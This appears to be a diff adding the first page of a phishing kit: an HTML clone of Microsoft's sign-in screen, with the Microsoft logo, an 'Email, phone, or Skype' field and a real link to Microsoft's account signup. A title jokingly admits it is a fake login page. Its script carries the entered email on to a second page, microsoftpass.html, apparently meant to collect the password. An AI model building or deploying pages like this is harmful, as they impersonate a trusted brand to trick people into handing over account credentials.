@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<html>
+  <head>
+    <title>Totally not a fake login page for a big multimedia company that I'm literally using their services right now.</title>
+    <link rel="stylesheet" href="microsoft.css">
+  </head>
+  <body>
+    <div class="bigContainer">
+      <div class="container">
+        <img src="microsoftlogo.svg"></img>
+        <br><br>
+        <h2 class="label">Sign in</h2>
+        <br><br>
+          <input type="text" placeholder="Email, phone, or Skype" id="email">
+          <br><br>
+          <small>No account? <a href="https://login.live.com/oauth20_authorize.srf?client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&scope=service%3a%3aaccount.microsoft.com%3a%3aMBI_SSL+openid+profile+offline_access&redirect_uri=https%3a%2f%2faccount.microsoft.com%2fauth%2fcomplete-signin-oauth&response_type=code&state=H4sIAAAAAAAEAAXB2aJCQAAA0H_p1YO4Q-bRZBkUxpLlzVLZSZj4-nvOCWzOCnrECvYHGP6DY3EoByMKCU_xI9T8fcgDXDHGBttftELVO09LAkEdWCX_ILj185a2QNOcpFUGKkS4iW3kLAsFZjxg5an6KVUtos9LMcnSn0A39HX0qVA7bUOheX9t60VOvVgBQ1D0lfObdnY2vPoiHVfa53otZgXMYbmatWc8fA3wpArBezONqQ0uRW6WvVVrl6D7NllkhnvLruRGia8p3yVUa5fT-SeDmDosghEmDMxwKp3xeQ7DvxXzlWemhDeSffW09irwOXuzDlSKBqd20jXV8p4XnGcjvu8rV_pxOb8aqSevA_nZDjs94p6JKlRC7poxSfZyYkaJZbD97eCOVApIIfrbYYOiGj6Oexzn5F4q3r7PNtFdXZaSThb7ca-B2N8Wz7wDYLH5OKeujOEn2JxR1qIpOuTkqBeOir-kDlC10VTMGhO9jR9U3NM_Z6xUfsIBAAA&x-client-SKU=MSAL.Desktop&x-client-Ver=4.58.1.0&uaid=72c8cf7d38f149279d990047c887fd16&msproxy=1&issuer=mso&tenant=common&ui_locales=en-US&client_info=1&signup=1&lw=1&fl=easi2&epct=PAQABDgEAAAApTwJmzXqdR4BN2miheQMYGAaJQvJew6dd4HhT7AfE9h0TKYXWj3yIMd52jMh-HtUhdEdgWt7dTIHbHqRUcJ24Q0bxLKchFVwi6d3WCgznAytv6Phmr68J9Wun4UFFeJb3DKFZzfwFU9K7UKx_hk1Gqzwiu3xSz3Lduy6a7vGZqwCn6ITrEpov4lodNZSLRc7wzAcTINC1tmD9mNv3OEq3zHWmXSZV3nt1zpHrAFXtSiAA&jshs=0">Create one!</a></small>
+          <br><br><br>
+        <br>
+        <button class="nextbutton" onclick="next()">Next</button>
+      </div>
+    </div>
+
+    <script>
+      function next() {
+        var email = document.getElementById("email").value;
+        location.replace('microsoftpass.html?email=' + email);
+      }
+    </script>
+    
+  </body>
+</html>
